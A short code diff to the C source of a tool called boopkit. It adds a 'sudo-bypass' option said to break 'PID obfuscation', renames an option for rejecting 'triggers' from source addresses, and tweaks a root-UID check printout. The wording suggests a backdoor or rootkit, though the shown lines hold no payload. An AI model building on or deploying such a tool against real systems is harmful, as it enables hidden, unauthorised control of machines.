@@ -61,7 +61,8 @@ void usage() {
   printf("\n");
   printf("Options:\n");
   printf("-h, help           Display help and usage for boopkit.\n");
-  printf("-x, ignore         Source addresses to reject triggers from.\n");
+  printf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
+  printf("-x, reject         Source addresses to reject triggers from.\n");
   printf("\n");
   exit(0);
 }
@@ -169,7 +170,7 @@ static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
 
 void rootcheck(int argc, char **argv) {
   long luid = (long)getuid();
-  printf("  -> getuid() : %ld\n", luid);
+  printf("  -> getuid()  : %ld\n", luid);
   if (luid != 0) {
     printf("  XX Invalid UID.\n");
     if (!cfg.sudobypass) {
